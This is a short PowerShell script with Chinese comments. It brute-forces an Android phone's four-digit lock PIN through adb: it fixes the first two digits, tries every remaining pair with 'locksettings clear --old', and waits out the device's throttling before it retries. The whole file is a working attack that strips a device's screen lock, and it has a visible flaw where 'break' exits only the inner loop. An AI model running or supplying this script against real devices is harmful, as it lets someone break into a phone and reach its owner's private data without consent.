# 固定的前两位
$fixedPart = "12"

# Loop to generate the last two digits
for ($randomPart1 = 0; $randomPart1 -le 9; $randomPart1++) {
    for ($randomPart2 = 0; $randomPart2 -le 9; $randomPart2++) {
        # 生成完整的密码
        $password = $fixedPart + $randomPart1 + $randomPart2
        
        # 输出测试信息

        # 使用 adb 清除锁定设置
        $output = & "C:\Users\r\Downloads\platform-tools\tools\adb.exe" shell locksettings clear --old $password 2>&1

        
        # 检查输出以确定是否成功
        if ($output -like "*Lock credential cleared*") {
            break  # 停止循环
        } elseif ($output -like "*successful*") {
            break  # 停止循环
        } elseif ($output -like "*didn't match*") {
        } elseif ($output -like "*Request throttled*") {
            Start-Sleep -Seconds 30  # 等待 30 秒再重试
        }
    }
}
